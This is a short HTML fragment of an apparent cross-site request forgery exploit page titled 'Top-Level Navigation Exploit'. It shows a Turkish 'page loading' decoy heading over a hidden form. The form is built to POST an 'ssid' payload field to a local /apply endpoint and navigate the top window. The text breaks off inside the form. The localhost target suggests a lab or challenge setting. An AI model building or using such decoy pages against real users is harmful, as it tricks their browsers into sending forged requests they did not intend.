  <title>Top-Level Navigation Exploit</title>

<body>
  <h2>Sayfa Yükleniyor...</h2>

  <form id="csrfForm" 
        action="http://127.0.0.1:5000/apply" 
        method="POST" 
        target="_top" 
        style="display:none;">
    <input type="hidden" name="ssid" id="payload">
